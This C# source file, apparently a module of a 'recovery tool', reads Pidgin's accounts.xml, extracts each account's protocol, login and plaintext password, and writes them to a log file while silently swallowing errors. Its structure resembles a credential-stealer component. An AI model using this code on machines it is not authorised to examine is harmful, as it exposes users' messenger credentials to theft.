using RecoveryTool.Recovery.Utilities;
using System.Text;
using System.Xml;

namespace RecoveryTool.Recovery.Messenger.Jabber
{
    public class PidginService
    {
        private static readonly string PidginPath = Path.Combine(Common.AppData, ".purple", "accounts.xml");

        public static async Task SavePidginAsync()
        {
            if (File.Exists(PidginPath))
            {
                string savePidginPath = Common.EnsurePidginPath();
                await GetDataPidginAsync(PidginPath, Path.Combine(savePidginPath, "Pidgin.log"));
            }
        }

        private static async Task GetDataPidginAsync(string pathPn, string saveFile)
        {
            try
            {
                if (!File.Exists(pathPn))
                {
                    return;
                }

                var sb = new StringBuilder();
                var xs = new XmlDocument();
                xs.Load(pathPn);

                foreach (XmlNode nl in xs.DocumentElement.ChildNodes)
                {
                    var protocol = nl.SelectSingleNode("protocol")?.InnerText;
                    var login = nl.SelectSingleNode("name")?.InnerText;
                    var password = nl.SelectSingleNode("password")?.InnerText;

                    if (string.IsNullOrEmpty(protocol) || string.IsNullOrEmpty(login) || string.IsNullOrEmpty(password))
                    {
                        continue;
                    }

                    sb.AppendLine($"Protocol: {protocol}");
                    sb.AppendLine($"Login: {login}");
                    sb.AppendLine($"Password: {password}");
                    sb.AppendLine();
                }

                if (sb.Length > 0)
                {
                    await File.AppendAllTextAsync(saveFile, sb.ToString());
                }
            } catch { }
        }
    }
}